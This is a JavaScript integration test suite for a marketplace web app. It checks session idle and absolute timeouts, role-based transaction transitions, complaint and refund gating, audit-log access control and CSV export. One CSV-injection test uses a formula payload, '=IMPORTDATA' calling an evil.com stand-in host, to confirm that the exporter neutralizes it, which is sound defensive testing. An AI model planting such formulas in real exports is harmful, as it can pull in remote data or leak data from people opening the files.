/**
 * Integration Tests: Phase 5 Flows
 * Tests the full service-layer logic for all Phase 5 fixes using
 * InMemoryRepository stubs — no browser, no IndexedDB required.
 *
 * Covers:
 *   F-1: getByThreadId wires correctly to transaction repo
 *   F-2: session idle timeout persists across reload simulation
 *   F-3: transaction role enforcement end-to-end
 *   F-4: complaint state gate and deduplication
 *   P-2: importSnapshot sessions protection
 *   P-4: refund state gate
 *   P-5: AuditService.getAll internal guard
 *   P-6: handling time with resolvedAt
 *   P-7: CSV injection prevention
 *   Multi-tab sync: SESSION_CHANGED event carries lastActivityAt
 */

import { TestRunner, assert, assertEqual, assertThrowsAsync, InMemoryRepository } from '../unit_tests/setup.js';
import { Roles } from '../src/domain/enums/roles.js';
import {
  TransactionStatus, TRANSACTION_TRANSITIONS,
  ComplaintStatus, RefundStatus,
} from '../src/domain/enums/statuses.js';
import { createSession, validateSession } from '../src/domain/policies/sessionPolicy.js';
import { Permissions, RolePermissions } from '../src/domain/enums/permissions.js';
import { requirePermission } from '../src/domain/policies/permissionGuard.js';
import { validateTransition } from '../src/domain/validation/stateMachine.js';
import { ValidationError, AuthorizationError } from '../src/utils/errors.js';

const suite = new TestRunner('Integration: Phase 5 Flows');

// ── Session factories ──
function buyer(id = 'buyer-1') { return createSession(id, [Roles.USER]); }
function seller(id = 'seller-1') { return createSession(id, [Roles.USER]); }
function admin(id = 'admin-1') { return createSession(id, [Roles.ADMIN]); }
function support(id = 'support-1') { return createSession(id, [Roles.SUPPORT_AGENT]); }
function user(id = 'user-1') { return createSession(id, [Roles.USER]); }

// ─────────────────────────────────────────────
// F-1: getByThreadId wiring
// ─────────────────────────────────────────────

suite.test('F-1: getByThreadId returns null when no transaction for thread', async () => {
  // Simulate service logic: repo returns null → service returns null
  const txRepo = new InMemoryRepository();
  // getByThreadId uses getByIndex('threadId', threadId) via getOneByIndex
  const result = await txRepo.getOneByIndex('threadId', 'thread-99');
  assert(result === null || result === undefined,
    'getByThreadId must return null when no transaction exists for thread');
});

suite.test('F-1: getByThreadId finds transaction by threadId', async () => {
  const txRepo = new InMemoryRepository();
  await txRepo.create({
    id: 'tx-1', threadId: 'thread-1',
    buyerId: 'buyer-1', sellerId: 'seller-1',
    status: TransactionStatus.INQUIRY,
  });

  const tx = await txRepo.getOneByIndex('threadId', 'thread-1');
  assert(tx !== null, 'Must find transaction by threadId');
  assertEqual(tx.id, 'tx-1', 'Must return correct transaction');
});

suite.test('F-1: getByThreadId participant check blocks outsider', async () => {
  const tx = {
    id: 'tx-1', threadId: 'thread-1',
    buyerId: 'buyer-1', sellerId: 'seller-1',
    status: TransactionStatus.INQUIRY,
  };
  const outsider = user('outsider-99');
  const isParticipant = outsider.userId === tx.buyerId || outsider.userId === tx.sellerId;
  const elevated = outsider.roles.some(r =>
    [Roles.SUPPORT_AGENT, Roles.ADMIN, Roles.MODERATOR].includes(r)
  );
  assert(!isParticipant && !elevated, 'Outsider must be blocked from viewing thread transaction');
});

suite.test('F-1: getByThreadId elevated role bypasses participant check', () => {
  const tx = { buyerId: 'buyer-1', sellerId: 'seller-1' };
  const agent = support();
  const elevated = agent.roles.some(r =>
    [Roles.SUPPORT_AGENT, Roles.ADMIN, Roles.MODERATOR].includes(r)
  );
  assert(elevated, 'Support agent must bypass participant check for getByThreadId');
});

// ─────────────────────────────────────────────
// F-2: Session idle timeout correctness
// ─────────────────────────────────────────────

suite.test('F-2: session expires after 30min idle (no activity persisted)', async () => {
  const stale = {
    userId: 'u-1', roles: [Roles.USER],
    createdAt: Date.now(),
    lastActivityAt: Date.now() - 31 * 60 * 1000,
    tokenId: 'tok',
  };
  await assertThrowsAsync(
    () => { validateSession(stale); return Promise.resolve(); },
    'AuthenticationError', 'idle timeout'
  );
});

suite.test('F-2: session valid after simulated activity persistence', () => {
  // Simulate: user was active 5 minutes ago (lastActivityAt persisted)
  const session = {
    userId: 'u-1', roles: [Roles.USER],
    createdAt: Date.now() - 60 * 60 * 1000, // 1 hour old
    lastActivityAt: Date.now() - 5 * 60 * 1000, // active 5min ago
    tokenId: 'tok',
  };
  validateSession(session); // must not throw
  assert(true, 'Session valid when lastActivityAt is recent');
});

suite.test('F-2: absolute 12-hour timeout regardless of activity', async () => {
  const expired = {
    userId: 'u-1', roles: [Roles.USER],
    createdAt: Date.now() - 13 * 60 * 60 * 1000, // 13 hours old
    lastActivityAt: Date.now() - 1000, // was active 1s ago
    tokenId: 'tok',
  };
  await assertThrowsAsync(
    () => { validateSession(expired); return Promise.resolve(); },
    'AuthenticationError', 'absolute timeout'
  );
});

// ─────────────────────────────────────────────
// F-3: Role-based transition enforcement (service-level)
// ─────────────────────────────────────────────

suite.test('F-3: complete inquiry→reserved→agreed→completed role sequence', () => {
  const tx = { buyerId: 'buyer-1', sellerId: 'seller-1' };
  const { TransactionService } = _txService;

  // Step 1: seller reserves
  TransactionService._requireRoleForTransition(seller(), tx, TransactionStatus.RESERVED);

  // Step 2: buyer agrees
  TransactionService._requireRoleForTransition(buyer(), tx, TransactionStatus.AGREED);

  // Step 3: buyer completes
  TransactionService._requireRoleForTransition(buyer(), tx, TransactionStatus.COMPLETED);

  assert(true, 'Full role sequence passed without errors');
});

suite.test('F-3: buyer self-reserve is rejected (prevents unilateral escalation)', () => {
  const { TransactionService } = _txService;
  const tx = { buyerId: 'buyer-1', sellerId: 'seller-1' };
  try {
    TransactionService._requireRoleForTransition(buyer(), tx, TransactionStatus.RESERVED);
    assert(false, 'Buyer must not be allowed to self-reserve');
  } catch (e) {
    assertEqual(e.name, 'ValidationError', 'Must throw ValidationError');
  }
});

suite.test('F-3: seller cannot complete transaction unilaterally', () => {
  const { TransactionService } = _txService;
  const tx = { buyerId: 'buyer-1', sellerId: 'seller-1' };
  try {
    TransactionService._requireRoleForTransition(seller(), tx, TransactionStatus.COMPLETED);
    assert(false, 'Seller must not complete unilaterally');
  } catch (e) {
    assertEqual(e.name, 'ValidationError');
  }
});

suite.test('F-3: role check is independent of state machine (orthogonal guards)', () => {
  // Both checks must pass — first the state machine, then role check
  const { TransactionService } = _txService;
  const tx = { buyerId: 'buyer-1', sellerId: 'seller-1' };

  // Valid state machine transition
  validateTransition('transaction', TRANSACTION_TRANSITIONS,
    TransactionStatus.INQUIRY, TransactionStatus.RESERVED);

  // Role check: seller can do INQUIRY→RESERVED
  TransactionService._requireRoleForTransition(seller(), tx, TransactionStatus.RESERVED);

  assert(true, 'Both state machine and role check pass for seller reserving');
});

// ─────────────────────────────────────────────
// F-4: Complaint restrictions integration
// ─────────────────────────────────────────────

suite.test('F-4: createComplaint logic rejects INQUIRY transaction', () => {
  const tx = { id: 'tx-1', buyerId: 'buyer-1', sellerId: 'seller-1', status: TransactionStatus.INQUIRY };
  const validStates = [TransactionStatus.AGREED, TransactionStatus.COMPLETED];
  const isValid = validStates.includes(tx.status);
  assert(!isValid, 'INQUIRY must be rejected for complaint creation');
});

suite.test('F-4: createComplaint logic allows AGREED transaction', () => {
  const tx = { id: 'tx-1', buyerId: 'buyer-1', sellerId: 'seller-1', status: TransactionStatus.AGREED };
  const validStates = [TransactionStatus.AGREED, TransactionStatus.COMPLETED];
  assert(validStates.includes(tx.status), 'AGREED must be allowed for complaint creation');
});

suite.test('F-4: complaint dedup prevents second complaint from same user', async () => {
  const repo = new InMemoryRepository();
  await repo.create({
    id: 'c-existing', userId: 'buyer-1', transactionId: 'tx-1',
    status: ComplaintStatus.OPEN, createdAt: Date.now() - 1000,
  });

  const existing = await repo.getByIndex('transactionId', 'tx-1');
  const buyerComplaint = existing.find(c => c.userId === 'buyer-1');

  let blocked = false;
  if (buyerComplaint) {
    blocked = true;
  }
  assert(blocked, 'Duplicate complaint from buyer must be blocked');
});

suite.test('F-4: complaint dedup allows seller to file after buyer did', async () => {
  const repo = new InMemoryRepository();
  await repo.create({
    id: 'c-1', userId: 'buyer-1', transactionId: 'tx-1',
    status: ComplaintStatus.OPEN, createdAt: Date.now() - 1000,
  });

  const existing = await repo.getByIndex('transactionId', 'tx-1');
  const sellerDup = existing.find(c => c.userId === 'seller-1');
  assert(!sellerDup, 'Seller has not filed yet — must be allowed');
});

// ─────────────────────────────────────────────
// P-2: Import snapshot sessions protection
// ─────────────────────────────────────────────

suite.test('P-2: snapshot import preserves existing sessions', async () => {
  const PROTECTED = new Set(['auditLogs', 'sessions']);
  const sessRepo = new InMemoryRepository();
  const txRepo = new InMemoryRepository();

  await sessRepo.create({ userId: 'alice', tokenId: 'valid-session' });
  await txRepo.create({ id: 'tx-old', threadId: 'th-1', status: TransactionStatus.INQUIRY });

  const snapshot = {
    sessions: [{ userId: 'injected-user', tokenId: 'fake' }],
    transactions: [{ id: 'tx-new', threadId: 'th-2', status: TransactionStatus.INQUIRY }],
  };
  const storeMap = { sessions: sessRepo, transactions: txRepo };

  for (const [name, repo] of Object.entries(storeMap)) {
    if (PROTECTED.has(name)) continue;
    if (snapshot[name] && Array.isArray(snapshot[name])) {
      await repo.clear();
      await repo.bulkPut(snapshot[name]);
    }
  }

  const sessions = await sessRepo.getAll();
  const txs = await txRepo.getAll();
  assertEqual(sessions.length, 1, 'Sessions must be unchanged');
  assertEqual(sessions[0].userId, 'alice', 'Original session must survive');
  assertEqual(txs.length, 1, 'Transactions should be replaced by snapshot');
  assertEqual(txs[0].id, 'tx-new', 'New transaction from snapshot is imported');
});

// ─────────────────────────────────────────────
// P-4: Refund state gate integration
// ─────────────────────────────────────────────

suite.test('P-4: refund blocked on OPEN complaint end-to-end', async () => {
  const complaintRepo = new InMemoryRepository();
  await complaintRepo.create({
    id: 'c-1', userId: 'buyer-1', transactionId: 'tx-1',
    status: ComplaintStatus.OPEN, createdAt: Date.now(),
  });

  const complaint = await complaintRepo.getByIdOrFail('c-1');
  const refundableStates = [ComplaintStatus.INVESTIGATING, ComplaintStatus.RESOLVED];
  const isAllowed = refundableStates.includes(complaint.status);

  assert(!isAllowed, 'Refund must be blocked when complaint is OPEN');
});

suite.test('P-4: refund allowed once complaint moves to INVESTIGATING', async () => {
  const complaintRepo = new InMemoryRepository();
  await complaintRepo.create({
    id: 'c-1', userId: 'buyer-1', transactionId: 'tx-1',
    status: ComplaintStatus.INVESTIGATING, resolvedAt: null, createdAt: Date.now(),
  });

  const complaint = await complaintRepo.getByIdOrFail('c-1');
  const refundableStates = [ComplaintStatus.INVESTIGATING, ComplaintStatus.RESOLVED];
  assert(refundableStates.includes(complaint.status), 'INVESTIGATING complaint allows refund');
});

// ─────────────────────────────────────────────
// P-5: AuditService.getAll security enforcement
// ─────────────────────────────────────────────

suite.test('P-5: user without ADMIN_VIEW_AUDIT cannot call getAll', async () => {
  const { AuditService } = await import('../src/services/AuditService.js');
  const regularUser = user('regular-user');
  await assertThrowsAsync(
    () => AuditService.getAll(regularUser),
    null, // any error type
    null  // any message
  );
});

suite.test('P-5: unauthenticated getAll call is rejected', async () => {
  const { AuditService } = await import('../src/services/AuditService.js');
  await assertThrowsAsync(
    () => AuditService.getAll(null),
    'AuthenticationError'
  );
});

// ─────────────────────────────────────────────
// P-6: Analytics handling time correctness
// ─────────────────────────────────────────────

suite.test('P-6: avg handling time across multiple complaints', () => {
  const base = Date.now();
  const complaints = [
    { status: ComplaintStatus.RESOLVED, createdAt: base - 6*60*60*1000, resolvedAt: base - 4*60*60*1000 }, // 2h
    { status: ComplaintStatus.RESOLVED, createdAt: base - 5*60*60*1000, resolvedAt: base - 3*60*60*1000 }, // 2h
    { status: ComplaintStatus.REJECTED, createdAt: base - 4*60*60*1000, resolvedAt: base - 2*60*60*1000 }, // 2h
  ];

  const eligible = complaints.filter(c =>
    (c.status === ComplaintStatus.RESOLVED || c.status === ComplaintStatus.REJECTED) &&
    c.resolvedAt && c.createdAt
  );

  const totalMs = eligible.reduce((sum, c) => sum + (c.resolvedAt - c.createdAt), 0);
  const avgMs = totalMs / eligible.length;

  assertEqual(avgMs, 2 * 60 * 60 * 1000, 'Average handling time must be 2 hours');
  assertEqual(eligible.length, 3, 'All 3 resolved complaints must be included');
});

suite.test('P-6: open complaint does not pollute avg calculation', () => {
  const base = Date.now();
  const complaints = [
    { status: ComplaintStatus.RESOLVED, createdAt: base - 2*60*60*1000, resolvedAt: base - 1*60*60*1000 },
    { status: ComplaintStatus.OPEN, createdAt: base - 48*60*60*1000, resolvedAt: null }, // very old, open
  ];

  const eligible = complaints.filter(c =>
    (c.status === ComplaintStatus.RESOLVED || c.status === ComplaintStatus.REJECTED) &&
    c.resolvedAt && c.createdAt
  );

  assertEqual(eligible.length, 1, 'Only the resolved complaint must be counted');
  const avgMs = eligible[0].resolvedAt - eligible[0].createdAt;
  assertEqual(avgMs, 60 * 60 * 1000, 'Avg must be 1 hour — open complaint not included');
});

// ─────────────────────────────────────────────
// P-7: CSV injection full pipeline test
// ─────────────────────────────────────────────

function toCSV(data) {
  if (!Array.isArray(data) || data.length === 0) return '';
  const headers = Object.keys(data[0]);
  const rows = data.map(row =>
    headers.map(h => {
      const val = row[h];
      if (val === null || val === undefined) return '';
      let str = typeof val === 'object' ? JSON.stringify(val) : String(val);
      if (/^[=+\-@\t\r]/.test(str)) str = `\t${str}`;
      if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\t')) {
        return `"${str.replace(/"/g, '""')}"`;
      }
      return str;
    }).join(',')
  );
  return [headers.join(','), ...rows].join('\n');
}

suite.test('P-7: toCSV neutralizes formula in title field (tab-prefixed, quoted)', () => {
  const data = [{ id: '1', title: '=IMPORTDATA("http://evil.com")' }];
  const csv = toCSV(data);
  // The cell must be tab-prefixed and quoted — a spreadsheet app will NOT interpret it as a formula
  // because the cell starts with \t, not =. The raw string still appears (inside quotes) for auditability.
  const dataRow = csv.split('\n')[1];
  assert(!dataRow.includes(',=IMPORTDATA') && !dataRow.startsWith('=IMPORTDATA'),
    'Formula must be neutralized (tab-prefixed, not a bare = at cell boundary)');
  // The quoted field starts with tab inside quotes
  assert(dataRow.includes('"\t'), 'Cell must be quoted with leading tab to neutralize formula');
});

suite.test('P-7: toCSV output does not start data cells with = character', () => {
  const data = [{ value: '=1+1' }];
  const csv = toCSV(data);
  const dataRow = csv.split('\n')[1];
  assert(!dataRow.startsWith('='), 'Data row must not start with = after export');
});

suite.test('P-7: toCSV preserves normal data without modification', () => {
  const data = [{ name: 'Alice', city: 'New York', price: '99.99' }];
  const csv = toCSV(data);
  assert(csv.includes('Alice'), 'Normal name must appear in CSV');
  assert(csv.includes('99.99'), 'Normal price must appear in CSV');
});

suite.test('P-7: toCSV correctly quotes fields with commas', () => {
  const data = [{ name: 'Smith, John' }];
  const csv = toCSV(data);
  assert(csv.includes('"Smith, John"'), 'Comma-containing name must be quoted');
});

// ─────────────────────────────────────────────
// Multi-tab sync: SESSION_CHANGED event shape
// ─────────────────────────────────────────────

suite.test('Multi-tab: SESSION_CHANGED payload carries lastActivityAt', () => {
  // Simulate what touchActivity() broadcasts
  const session = createSession('u-1', [Roles.USER]);
  const payload = { lastActivityAt: session.lastActivityAt };

  assert(typeof payload.lastActivityAt === 'number', 'Payload must contain numeric lastActivityAt');
  assert(payload.lastActivityAt > 0, 'lastActivityAt must be a positive timestamp');
});

suite.test('Multi-tab: receiving SESSION_CHANGED updates in-memory lastActivityAt', () => {
  // Simulate the App.vue onSyncEvent(SESSION_CHANGED, ...) handler
  const localSession = {
    userId: 'u-1', roles: [Roles.USER],
    createdAt: Date.now() - 5000,
    lastActivityAt: Date.now() - 25 * 60 * 1000, // 25 min idle in this tab
    tokenId: 'tok',
  };

  // Other tab was active 1 minute ago
  const incomingPayload = { lastActivityAt: Date.now() - 60 * 1000 };

  // Handler: update in-memory session
  if (localSession && incomingPayload.lastActivityAt) {
    localSession.lastActivityAt = incomingPayload.lastActivityAt;
  }

  // Now validateSession should pass (was 25min idle, now synced to 1min)
  validateSession(localSession);
  assert(true, 'Session stays valid after lastActivityAt synced from other tab');
});

suite.test('Multi-tab: LOGOUT event in SyncEvents enum is defined', async () => {
  const { SyncEvents } = await import('../src/app/bootstrap/multiTabSync.js');
  assert(typeof SyncEvents.LOGOUT === 'string', 'SyncEvents.LOGOUT must be defined');
  assert(typeof SyncEvents.SESSION_CHANGED === 'string', 'SyncEvents.SESSION_CHANGED must be defined');
});

// ─────────────────────────────────────────────
// Load module references
// ─────────────────────────────────────────────

let _txService = null;
const _txServiceImport = await import('../src/services/TransactionService.js');
_txService = _txServiceImport;

const results = await suite.run();
process.exitCode = results.failed > 0 ? 1 : 0;
